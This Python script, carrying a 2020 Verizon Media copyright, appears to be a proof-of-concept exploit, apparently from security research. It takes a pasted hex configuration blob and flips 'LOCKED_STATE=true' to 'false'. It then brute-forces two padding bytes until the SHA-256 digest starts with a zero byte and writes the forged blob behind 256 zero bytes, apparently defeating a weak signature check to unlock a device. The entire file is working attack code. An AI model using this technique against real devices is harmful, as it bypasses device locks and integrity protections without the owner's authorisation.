#!/usr/bin/env python3

# Copyright 2020, Verizon Media
# Licensed under the terms of the MIT license. See LICENSE file in project root for terms.

import binascii
import sys
from Crypto.Hash import SHA256

if len(sys.argv) < 2:
    print("Usage: {} outfile".format(sys.argv[0]))
    sys.exit(1)

outfn = sys.argv[1]

print("Paste configuration data blob now")

i = 0
lines = []
while i < 24:
    lines.append(input())
    i += 1

# print(lines)
allbytes_hex = ''.join(lines)
allbytes_bin = binascii.unhexlify(allbytes_hex)
# print(allbytes_bin)

old_blob_payload = allbytes_bin[256:]
print(old_blob_payload)

blob_payload_modified = old_blob_payload.strip().replace(b"LOCKED_STATE=true", b"LOCKED_STATE=false")
blob_payload_modified += b"\n#"
print(blob_payload_modified)

for x1 in range(32, 127):
    for x2 in range(32, 127):
        data_ = blob_payload_modified + bytes([x1, x2])
        data_ = data_ + b" " * (128 - len(data_))
        h = SHA256.new()
        h.update(data_)
        d = h.digest()
        if d[0] == 0:
            with open(outfn, 'wb') as f:
                f.write(b'\x00' * 256)
                f.write(data_)
